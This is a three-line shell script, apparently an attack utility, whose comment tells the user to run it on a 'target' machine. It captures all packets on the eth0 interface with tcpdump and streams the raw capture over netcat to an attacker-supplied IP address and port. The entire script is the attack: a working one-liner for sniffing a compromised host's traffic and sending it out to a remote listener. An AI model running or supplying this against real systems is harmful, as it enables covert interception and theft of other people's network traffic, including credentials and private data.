# Run This script on the target with the parameters for your netcat listener
echo $0 [IP] [PORT]
tcpdump -s 0 -U -n -w - -i eth0 | nc $1 $2
